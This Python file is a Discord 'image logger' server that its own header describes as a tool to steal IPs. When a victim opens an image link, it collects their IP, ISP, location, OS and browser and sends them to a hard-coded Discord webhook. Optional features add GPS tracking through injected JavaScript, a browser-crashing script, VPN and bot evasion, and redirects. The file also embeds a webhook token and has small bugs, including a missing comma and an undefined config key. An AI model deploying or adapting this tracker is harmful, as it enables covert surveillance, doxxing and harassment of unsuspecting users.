from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "YoshiDevs"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1152675299524346066/1xolv240jxLOCADC9fE7wz7y3YjyrOTnya63ef72eGDbxHqMji4-QyRZkUcYrtYnlES3",
    "image": "data:image/jpeg;base64,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"
    # CUSTOMIZATION #
    "username": "Maloka Logger V2", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "You Are gay?", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "http://canarytokens.com/tags/mep0bfpa9ft13n82865dg0csd/submit.aspx" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI

